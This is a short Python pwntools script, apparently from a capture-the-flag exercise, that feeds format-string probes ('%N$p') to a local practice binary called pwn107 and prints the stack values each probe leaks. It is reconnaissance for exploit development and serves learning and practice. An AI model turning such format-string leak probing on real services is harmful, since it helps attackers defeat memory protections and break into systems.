from pwn import *

elf = context.binary = ELF('./pwn107-1644307530397.pwn107', checksec=False)

for i in range(50):
    try:
        p = process(level='error')
        p.sendlineafter("?", '%{}$p'.format(i).encode())
        p.recvline()

        result = p.recvline().decode()

        if result:
            result = result.split(":")
            result = result[1]
            print(str(i) + ': ' + str(result).strip())

    except EOFError:
        pass
